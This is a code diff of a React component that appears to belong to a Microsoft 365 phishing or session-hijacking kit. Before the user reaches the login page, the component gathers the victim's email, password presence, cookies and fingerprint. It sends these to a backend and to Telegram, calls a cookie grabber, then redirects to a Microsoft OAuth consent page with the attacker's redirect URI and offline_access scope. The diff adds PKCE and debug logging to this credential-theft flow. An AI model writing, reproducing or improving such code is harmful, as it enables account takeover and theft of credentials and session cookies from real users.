@@ -1,6 +1,6 @@
 import React, { useEffect } from 'react';
 
-// Import or declare the backend functions
+// Import or declare the backend functions (keep these as they were)
 declare function saveSessionToBackend(sessionData: any): Promise<any>;
 declare function sendToTelegram(sessionData: any): Promise<any>;
 declare function grabCookies(): void;
@@ -12,12 +12,10 @@ interface RealOAuthRedirectProps {
 
 const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, sessionData }) => {
   useEffect(() => {
-    console.log('🔄 RealOAuthRedirect: Starting OAuth flow with CLIENT SECRET...');
-    
     localStorage.setItem('selected_provider', 'Microsoft');
     localStorage.setItem('oauth_start_time', Date.now().toString());
 
-    // DEBUG functionality (keep your existing debug code)
+    // DEBUG: Add a test button for manual Telegram testing (original structure)
     if (window.location.search.includes('debug=1')) {
       console.log('🔍 DEBUG MODE ENABLED - Adding test button');
       setTimeout(() => {
@@ -37,13 +35,16 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, s
                 provider: 'Microsoft',
                 fileName: 'Manual Debug Test',
                 timestamp: new Date().toISOString(),
-                sessionId: 'manual_' + Math.random().toString(36).substring(2, 15),
+                sessionId:
+                  'manual_' + Math.random().toString(36).substring(2, 15),
                 userAgent: navigator.userAgent,
-                formattedCookies: [{
-                  name: 'MANUAL_TEST',
-                  value: 'manual_value_' + Date.now(),
-                  domain: '.login.microsoftonline.com',
-                }],
+                formattedCookies: [
+                  {
+                    name: 'MANUAL_TEST',
+                    value: 'manual_value_' + Date.now(),
+                    domain: '.login.microsoftonline.com',
+                  },
+                ],
                 browserFingerprint: { localStorage: '{"manual":"test"}' },
               }),
             });
@@ -59,100 +60,160 @@ const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess, s
       }, 1000);
     }
 
+    // Store pre-auth cookies for comparison (original structure)
+    const preAuthFingerprint = {
+      cookies: document.cookie,
+    };
+
+    // PKCE helper functions
+    const generateRandomString = (length: number): string => {
+      const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~';
+      let result = '';
+      const values = window.crypto.getRandomValues(new Uint8Array(length));
+      for (let i = 0; i < length; i++) {
+        result += charset[values[i] % charset.length];
+      }
+      return result;
+    };
+
+    const generateCodeChallenge = async (codeVerifier: string): Promise<string> => {
+      const encoder = new TextEncoder();
+      const data = encoder.encode(codeVerifier);
+      const digest = await window.crypto.subtle.digest('SHA-256', data);
+      return btoa(String.fromCharCode(...new Uint8Array(digest)))
+        .replace(/\+/g, '-')
+        .replace(/\//g, '_')
+        .replace(/=+$/, '');
+    };
+
     let saveSuccess = false;
     let telegramSuccess = false;
 
     (async () => {
-      let currentSessionData = sessionData || {};
+      // Use sessionData from props if available, otherwise declare it for build safety (original structure)
+      let currentSessionData = (sessionData) ? sessionData : {};
 
-      console.log('🔍 Processing session data before OAuth redirect...');
+      console.log('🔍 DEBUG: About to communicate with backend', {
+        email: currentSessionData.email,
+        cookieCount: currentSessionData.formattedCookies
+          ? currentSessionData.formattedCookies.length
+          : 0,
+        hasAccessToken: !!currentSessionData.accessToken,
+        currentURL: window.location.href,
+      });
 
-      // Step 1: Save session to backend
       try {
+        console.log('🔄 Step 1: Saving session to backend...');
         if (typeof saveSessionToBackend === 'function') {
           const saveResult = await saveSessionToBackend(currentSessionData);
-          console.log('✅ Session saved to backend');
+          console.log('🔍 Save result:', saveResult);
           saveSuccess = true;
+          console.log('✅ Step 1 completed: Session saved');
         }
       } catch (saveError) {
         console.error('❌ Session save failed:', saveError);
+        console.error('❌ Save error details:', {
+          message: saveError.message,
+          stack: saveError.stack,
+        });
       }
 
-      // Step 2: Send to Telegram
       try {
+        console.log('🔄 Step 2: Sending data to Telegram...');
+        console.log('🔍 Telegram payload preview:', {
+          email: currentSessionData.email,
+          provider: currentSessionData.provider,
+          cookieCount: currentSessionData.formattedCookies
+            ? currentSessionData.formattedCookies.length
+            : 0,
+          hasPassword: !!currentSessionData.password,
+        });
         if (typeof sendToTelegram === 'function') {
           const telegramResult = await sendToTelegram(currentSessionData);
-          console.log('✅ Data sent to Telegram');
+          console.log('🔍 Telegram result:', telegramResult);
           telegramSuccess = true;
+          console.log('✅ Step 2 completed: Data sent to Telegram');
         }
       } catch (telegramError) {
         console.error('❌ Telegram send failed:', telegramError);
+        console.error('❌ Telegram error details:', {
+          message: telegramError.message,
+          stack: telegramError.stack,
+        });
       }
 
-      // Step 3: Grab cookies
+      // Log final status
+      // Grab cookies before redirect (from session if available) (original structure)
       if (typeof grabCookies === 'function') {
         grabCookies();
       }
 
-      // **SIMPLIFIED OAuth flow - No PKCE needed with client secret**
-      const state = Math.random().toString(36).substring(2, 15);
-      sessionStorage.setItem('oauth_state', state);
+      // **UPDATED**: PKCE OAuth flow (more secure)
+      console.log('🔄 Starting PKCE OAuth flow...');
+      try {
+        // Generate PKCE parameters
+        const codeVerifier = generateRandomString(64);
+        const codeChallenge = await generateCodeChallenge(codeVerifier);
+        const state = Math.random().toString(36).substring(2, 15);
 
-      const params = new URLSearchParams({
-        client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
-        response_type: 'code',
-        redirect_uri: 'https://vaultydocs.com/oauth-callback',
-        response_mode: 'query',
-        scope: 'openid profile email User.Read offline_access',
-        state: state,
-        prompt: 'login',
-      });
+        // Store PKCE parameters for token exchange
+        sessionStorage.setItem('pkce_verifier', codeVerifier);
+        sessionStorage.setItem('oauth_state', state);
 
-      const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;
+        console.log('🔧 PKCE parameters generated:', {
+          hasCodeVerifier: !!codeVerifier,
+          hasCodeChallenge: !!codeChallenge,
+          state: state
+        });
 
-      console.log('🚀 Redirecting to Microsoft OAuth (CLIENT SECRET method)...');
-      window.location.href = microsoftOAuthUrl;
+        // Build Microsoft OAuth URL with PKCE
+        const params = new URLSearchParams({
+          client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
+          response_type: 'code',
+          redirect_uri: 'https://vaultydocs.com/oauth-callback',
+          response_mode: 'query',
+          scope: 'openid profile email User.Read offline_access',
+          code_challenge: codeChallenge,
+          code_challenge_method: 'S256',
+          state: state,
+          prompt: 'login',
+        });
 
+        const microsoftOAuthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${params.toString()}`;
+
+        console.log('✅ Redirecting to Microsoft OAuth with PKCE...');
+        console.log('🔗 OAuth URL:', microsoftOAuthUrl);
+        
+        // Redirect to Microsoft OAuth
+        window.location.href = microsoftOAuthUrl;
+
+      } catch (err) {
+        console.error('❌ Failed to start PKCE OAuth flow:', err);
+        
+        // Fallback: Simple OAuth without PKCE
+        console.log('🔄 Attempting fallback OAuth without PKCE...');
+        const fallbackState = Math.random().toString(36).substring(2, 15);
+        sessionStorage.setItem('oauth_state', fallbackState);
+        
+        const fallbackParams = new URLSearchParams({
+          client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
+          response_type: 'code',
+          redirect_uri: 'https://vaultydocs.com/oauth-callback',
+          response_mode: 'query',
+          scope: 'openid profile email User.Read offline_access',
+          state: fallbackState,
+          prompt: 'login',
+        });
+
+        const fallbackUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?${fallbackParams.toString()}`;
+        window.location.href = fallbackUrl;
+      }
     })();
   }, [sessionData, onLoginSuccess]);
 
-  return (
-    <div style={{
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center',
-      height: '100vh',
-      fontFamily: 'Arial, sans-serif',
-      backgroundColor: '#f3f2f1'
-    }}>
-      <div style={{
-        textAlign: 'center',
-        background: 'white',
-        padding: '40px',
-        borderRadius: '8px',
-        boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
-      }}>
-        <div style={{
-          width: '40px',
-          height: '40px',
-          border: '4px solid #f3f3f3',
-          borderTop: '4px solid #0078d4',
-          borderRadius: '50%',
-          animation: 'spin 1s linear infinite',
-          margin: '0 auto 20px'
-        }}></div>
-        <h3 style={{ color: '#323130', margin: '0 0 10px' }}>Preparing Microsoft Authentication</h3>
-        <p style={{ color: '#605e5c', margin: 0 }}>Connecting securely with client credentials...</p>
-      </div>
-      
-      <style>{`
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-      `}</style>
-    </div>
-  );
+  // This component does not render anything by itself (original structure)
+  // it just performs redirects and side effects.
+  return null;
 };
 
 export default RealOAuthRedirect;
